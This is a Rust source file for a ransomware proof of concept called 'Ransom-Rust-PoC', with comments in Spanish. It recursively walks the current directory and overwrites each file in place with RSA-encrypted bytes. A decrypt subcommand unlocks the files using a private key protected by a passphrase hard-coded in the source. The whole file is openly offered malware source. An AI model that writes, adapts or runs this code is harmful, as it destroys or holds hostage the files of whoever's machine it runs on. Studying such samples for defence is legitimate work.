use clap::{App, SubCommand};
use openssl::rsa::{Padding, Rsa};
use std::fs::{read, File, OpenOptions};
use std::io::{Read, Write};
use std::path::Path;
use walkdir::WalkDir;

fn main() {
    // RSA pub and priv
    // Clave de descifrado
    let passphrase = "E;G$dfXBpv1>[6b6h4F!O=_-v#1$_a!0SV/Elv3jl<&~^|~HE]iL;2jRr^w+0XKq";
    // Leemos los archivos de clave publica y privada
    let mut clave_publica =
        File::open("../claves_rsa/rsa.public").expect("No se puede leer el archivo");
    let mut clave_privada =
        File::open("../claves_rsa/rsa.private").expect("No se puede leer el archivo");

    // Creamos las variables para almacenar los archivos
    let mut key_pub = String::new();
    let mut key_priv = String::new();

    // Leemos y guardamos los datos de los archivos en sendas variables
    clave_publica
        .read_to_string(&mut key_pub)
        .expect("Problema de lectura");
    clave_privada
        .read_to_string(&mut key_priv)
        .expect("Problema de lectura");

    // Argumentos
    let matches = App::new("Ransom-Rust-PoC")
        .version("0.3")
        .author("Ricardo M. Prieto (rchip)")
        .subcommand(SubCommand::with_name("cifrar"))
        .subcommand(SubCommand::with_name("descifrar"))
        .subcommand(SubCommand::with_name("iterar"))
        .get_matches();

    if let ("iterar", Some(_)) = matches.subcommand() {
        for entry in WalkDir::new("./").into_iter().filter_map(|e| e.ok()) {
            println!("{}", entry.path().display());
        }
    }

    if let ("cifrar", Some(_)) = matches.subcommand() {
        // Verificar el subcomando cifrar
        println!("Cifrando archivos...");
        let rsa = Rsa::public_key_from_pem(key_pub.as_bytes()).unwrap();
        for entry in WalkDir::new("./").into_iter().filter_map(|e| e.ok()) {
            // Leemos los archivos que están en el directorio
            let archivo = entry.path();
            // Extraemos el path de cada archivo
            cifrar_archivos(&archivo, &rsa);
            // Ciframos todo archivo en función del path y el cifrador
        }
        println!("Operación Terminada");
    }

    if let ("descifrar", Some(_)) = matches.subcommand() {
        // verificar el subcomando descifrar
        println!("Descifrando archivos...");
        let rsa = Rsa::private_key_from_pem_passphrase(key_priv.as_bytes(), passphrase.as_bytes())
            .unwrap();
        for entry in WalkDir::new("./").into_iter().filter_map(|e| e.ok()) {
            // Leemos los archivos que están en el directorio
            let archivo = entry.path();
            // Extraemos el path de cada archivo
            descifrar_archivos(&archivo, &rsa);
            // Ciframos todo archivo en función del path y el cifrador
        }
        println!("Operación terminada");
    }
}

fn cifrar_archivos(path: &Path, rsa_encrypt: &Rsa<openssl::pkey::Public>) -> () {
    if let Ok(mut file) = OpenOptions::new().write(true).read(true).open(path) {
        // Comprobar que el archivo se puede abrir como escritura
        if let Ok(content) = read(path) {
            // Leemos el archivo
            let mut buf: Vec<u8> = vec![0; rsa_encrypt.size() as usize];
            // buffer que almacenara el contenido cifrado
            rsa_encrypt
                .public_encrypt(&content, &mut buf, Padding::PKCS1)
                .unwrap();
            // cifrando el archivo
            file.write_all(&buf).unwrap();
            // reemplazando los bytes originales por los cifrados
        }
    }
}

fn descifrar_archivos(path: &Path, rsa_decrypt: &Rsa<openssl::pkey::Private>) -> () {
    if let Ok(mut file) = OpenOptions::new().read(true).write(true).open(path) {
        // Comprobar que el archivo se puede abrir como escritura y lectura
        if let Ok(content) = read(path) {
            let mut buf: Vec<u8> = vec![0; rsa_decrypt.size() as usize];
            rsa_decrypt
                .private_decrypt(&content, &mut buf, Padding::PKCS1)
                .unwrap();
            let elimina_padding = String::from_utf8(buf).unwrap();
            println!("{}", elimina_padding);
            let elimina_padding = elimina_padding.trim_matches(char::from(0));
            file.write_all(elimina_padding.as_bytes()).unwrap();
        }
    }
}
